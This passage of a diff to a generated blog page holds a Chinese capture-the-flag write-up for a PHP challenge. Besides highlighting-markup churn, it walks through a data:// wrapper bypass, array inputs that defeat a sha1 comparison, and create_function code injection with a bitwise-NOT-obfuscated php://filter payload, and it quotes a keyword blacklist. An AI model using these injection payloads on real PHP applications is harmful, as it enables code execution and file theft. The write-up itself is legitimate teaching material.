 <p><code>$_REQUEST</code>合并时，<strong>POST覆盖GET</strong>，最终<code>debu</code>的值是<code>1</code>，无字母。其他参数同理</p>
 
 <h3 id="第四层file_get_contents内容校验" data-numberify>第四层：file_get_contents内容校验<a class="anchor ms-1" href="#第四层file_get_contents内容校验"></a></h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">file_get_contents</span>($file) <span style="color:#f92672">!==</span> <span style="color:#e6db74">&#39;debu_debu_aqua&#39;</span>) <span style="color:#66d9ef">die</span>();
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$file</span><span class="p">)</span> <span class="o">!==</span> <span class="s1">&#39;debu_debu_aqua&#39;</span><span class="p">)</span> <span class="k">die</span><span class="p">();</span>
 </span></span></code></pre></div><p>这里要求<code>$file</code>指向的内容必须是<code>debu_debu_aqua</code>,那么用<code>data://</code>伪协议直接提供内容</p>
-<pre tabindex="0"><code>data://text/plain,debu_debu_aqua
-</code></pre><p>这个字符串包含字母，会被第三层过滤。在GET中传<code>data://</code>（URL编码），POST中传<code>file=1</code>覆盖，但<code>$file</code>变量已经在第二层条件通过后被赋值为GET的值，所以最终<code>$file</code>的值是<code>data://text/plain,debu_debu_aqua</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">data://text/plain,debu_debu_aqua
+</span></span></code></pre></div><p>这个字符串包含字母，会被第三层过滤。在GET中传<code>data://</code>（URL编码），POST中传<code>file=1</code>覆盖，但<code>$file</code>变量已经在第二层条件通过后被赋值为GET的值，所以最终<code>$file</code>的值是<code>data://text/plain,debu_debu_aqua</code></p>
 
 <h3 id="第五层sha1弱比较" data-numberify>第五层：SHA1弱比较<a class="anchor ms-1" href="#第五层sha1弱比较"></a></h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">sha1</span>($shana) <span style="color:#f92672">===</span> <span style="color:#a6e22e">sha1</span>($passwd) <span style="color:#f92672">&amp;&amp;</span> $shana <span style="color:#f92672">!=</span> $passwd)
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">sha1</span><span class="p">(</span><span class="nv">$shana</span><span class="p">)</span> <span class="o">===</span> <span class="nx">sha1</span><span class="p">(</span><span class="nv">$passwd</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nv">$shana</span> <span class="o">!=</span> <span class="nv">$passwd</span><span class="p">)</span>
 </span></span></code></pre></div><p>绕过这个，我们要传入数组</p>
-<pre tabindex="0"><code>shana[]=1
-passwd[]=2
-</code></pre><p>这样</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">shana[]=1
+</span></span><span class="line"><span class="ln">2</span><span class="cl">passwd[]=2
+</span></span></code></pre></div><p>这样</p>
 <ul>
 <li><code>sha1([])</code>返回<code>NULL</code></li>
 <li><code>NULL === NULL</code> → true</li>
@@ -485,10 +485,10 @@ passwd[]=2
 </ul>
 
 <h3 id="第六层code和arg双重过滤" data-numberify>第六层：$code和$arg双重过滤<a class="anchor ms-1" href="#第六层code和arg双重过滤"></a></h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/^[a-z0-9]*$/isD&#39;</span>, $code) <span style="color:#f92672">||</span> 
-</span></span><span style="display:flex;"><span>   <span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/fil|cat|flag|.../&#39;</span>, $arg)) { 
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">die</span>();
-</span></span><span style="display:flex;"><span>}
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/^[a-z0-9]*$/isD&#39;</span><span class="p">,</span> <span class="nv">$code</span><span class="p">)</span> <span class="o">||</span> 
+</span></span><span class="line"><span class="ln">2</span><span class="cl">   <span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/fil|cat|flag|.../&#39;</span><span class="p">,</span> <span class="nv">$arg</span><span class="p">))</span> <span class="p">{</span> 
+</span></span><span class="line"><span class="ln">3</span><span class="cl">    <span class="k">die</span><span class="p">();</span>
+</span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="p">}</span>
 </span></span></code></pre></div><table>
   <thead>
       <tr>
@@ -516,16 +516,16 @@ passwd[]=2
 <p><code>$code</code>和<code>$arg</code>这两个变量来源于<code>extract($_GET[&quot;flag&quot;]);</code></p>
 <p>所以<code>$code</code>和<code>$arg</code>来自GET参数<code>flag[code]</code>和<code>flag[arg]</code></p>
 <p>这两个参数我们传什么呢，最后一行代码是</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>$code(<span style="color:#e6db74">&#39;&#39;</span>, $arg);
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="nv">$code</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$arg</span><span class="p">);</span>
 </span></span></code></pre></div><p>如果 <code>$code = &quot;create_function&quot;</code>，就变成了：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">create_function</span>(<span style="color:#e6db74">&#39;&#39;</span>, $arg);
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="nx">create_function</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$arg</span><span class="p">);</span>
 </span></span></code></pre></div><p><code>create_function</code> 是 PHP 内置函数，作用是<strong>动态创建匿名函数</strong></p>
 <p>语法：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">create_function</span>(<span style="color:#e6db74">&#39;参数列表&#39;</span>, <span style="color:#e6db74">&#39;函数体代码&#39;</span>);
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="nx">create_function</span><span class="p">(</span><span class="s1">&#39;参数列表&#39;</span><span class="p">,</span> <span class="s1">&#39;函数体代码&#39;</span><span class="p">);</span>
 </span></span></code></pre></div><p>例如：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">create_function</span>(<span style="color:#e6db74">&#39;$a&#39;</span>, <span style="color:#e6db74">&#39;return $a*2;&#39;</span>);
-</span></span><span style="display:flex;"><span><span style="color:#75715e">// 等价于
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">anonymous</span>($a) { <span style="color:#66d9ef">return</span> $a<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>; }
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="nx">create_function</span><span class="p">(</span><span class="s1">&#39;$a&#39;</span><span class="p">,</span> <span class="s1">&#39;return $a*2;&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="c1">// 等价于
+</span></span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="c1"></span><span class="k">function</span> <span class="nf">anonymous</span><span class="p">(</span><span class="nv">$a</span><span class="p">)</span> <span class="p">{</span> <span class="k">return</span> <span class="nv">$a</span><span class="o">*</span><span class="mi">2</span><span class="p">;</span> <span class="p">}</span>
 </span></span></code></pre></div><p>那么我们的<code>create_fuction</code>能通过吗</p>
 <p>可以的，它包含下划线，并不是纯字母</p>
 <p>那<code>$arg</code>呢？我们的目标是读取flag，黑名单里面过滤了很多函数，比如<code>readfile('flag.php')</code>，<code>file_get_contents('flag.php')</code>，<code>include 'flag.php'</code>，<code>require 'flag.php'</code>等等</p>
@@ -535,18 +535,18 @@ passwd[]=2
 
 <h3 id="取反构造读取flag的字符串" data-numberify>取反构造读取flag的字符串<a class="anchor ms-1" href="#取反构造读取flag的字符串"></a></h3>
 <p>目标：读取<code>rea1fl4g.php</code>文件（根据题目提示，flag在这个文件中）</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#75715e">// 需要执行的代码
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">require</span>(<span style="color:#e6db74">&#34;php://filter/convert.base64-encode/resource=rea1fl4g.php&#34;</span>);
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="c1">// 需要执行的代码
+</span></span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="c1"></span><span class="k">require</span><span class="p">(</span><span class="s2">&#34;php://filter/convert.base64-encode/resource=rea1fl4g.php&#34;</span><span class="p">);</span>
 </span></span></code></pre></div><p>我们要生成取反之后字符的URL编码，大概这样</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>$cmd <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;php://filter/convert.base64-encode/resource=rea1fl4g.php&#34;</span>;
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">urlencode</span>(<span style="color:#f92672">~</span>$cmd);
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="nv">$cmd</span> <span class="o">=</span> <span class="s2">&#34;php://filter/convert.base64-encode/resource=rea1fl4g.php&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="k">echo</span> <span class="nx">urlencode</span><span class="p">(</span><span class="o">~</span><span class="nv">$cmd</span><span class="p">);</span>
 </span></span></code></pre></div><p>取反后的字符串包含不可见字符，在URL中必须用<code>%</code>编码传递。PHP接收到后，<code>~'...'</code>会先解URL编码，再取反，得到原始字符串。</p>
 
 <h3 id="create_function注入" data-numberify>create_function注入<a class="anchor ms-1" href="#create_function注入"></a></h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">create_function</span>(<span style="color:#e6db74">&#39;&#39;</span>, <span style="color:#e6db74">&#39;;}require(~&#34;...&#34;);//&#39;</span>)
-</span></span><span style="display:flex;"><span><span style="color:#75715e">// 生成：
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">anonymous</span>() { ;}<span style="color:#66d9ef">require</span>(<span style="color:#f92672">~</span><span style="color:#e6db74">&#34;...&#34;</span>);<span style="color:#75715e">// }
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// 先执行 require(...)
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="nx">create_function</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;;}require(~&#34;...&#34;);//&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="c1">// 生成：
+</span></span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="c1"></span><span class="k">function</span> <span class="nf">anonymous</span><span class="p">()</span> <span class="p">{</span> <span class="p">;}</span><span class="k">require</span><span class="p">(</span><span class="o">~</span><span class="s2">&#34;...&#34;</span><span class="p">);</span><span class="c1">// }
+</span></span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="c1">// 先执行 require(...)
 </span></span></span></code></pre></div><p><del>呃。我这边拿不到flag，所以只写个原理吧（）</del></p>
 </div>
 </div>
@@ -1007,10 +1007,8 @@ passwd[]=2
 </div>
   <div class="col-12 col-lg-8 offset-0 offset-lg-1"></div>
 </div>
-<script src="/js/copy-code.js"></script>
-<link rel="stylesheet" href="/css/copy-code.css">
 </footer>
-<script data-precache src="/assets/main/bundle.min.d462af947fff0bbdb09a7b9fcb40a12bc7ca3b7ee172a4a5a35044386026b13d.js" integrity="sha256-1GKvlH//C72wmnufy0ChK8fKO37hcqSlo1BEOGAmsT0=" crossorigin="anonymous" async></script><script data-precache src="/assets/icons/bundle.min.0b03280daa4a59445b0aafc46855a2bb53b310e572534596869c33acaeec09dd.js" integrity="sha256-CwMoDapKWURbCq/EaFWiu1OzEOVyU0WWhpwzrK7sCd0=" crossorigin="anonymous" defer></script>
+<script data-precache src="/assets/main/bundle.min.87619fbefacaa035367e3393cad6ce3508196b946cf9962924868666df3f298f.js" integrity="sha256-h2GfvvrKoDU2fjOTytbONQgZa5Rs&#43;ZYpJIaGZt8/KY8=" crossorigin="anonymous" async></script><script data-precache src="/assets/icons/bundle.min.0b03280daa4a59445b0aafc46855a2bb53b310e572534596869c33acaeec09dd.js" integrity="sha256-CwMoDapKWURbCq/EaFWiu1OzEOVyU0WWhpwzrK7sCd0=" crossorigin="anonymous" defer></script>
 <script data-precache src="/assets/viewer/bundle.min.cca398d318de9fa7816141db90f09282784fcfe0c5dabc31599b8c589932e4ae.js" integrity="sha256-zKOY0xjen6eBYUHbkPCSgnhPz&#43;DF2rwxWZuMWJky5K4=" crossorigin="anonymous" defer></script>
 <script src="/js/toc-auto.635186e6d874d0dfed4a40f65dcc71e277a9772461a22e01fd1e5aabc804694d.js" integrity="sha256-Y1GG5th00N/tSkD2Xcxx4nepdyRhoi4B/R5aq8gEaU0=" crossorigin="anonymous" defer></script>
 <script src="https://giscus.app/client.js"
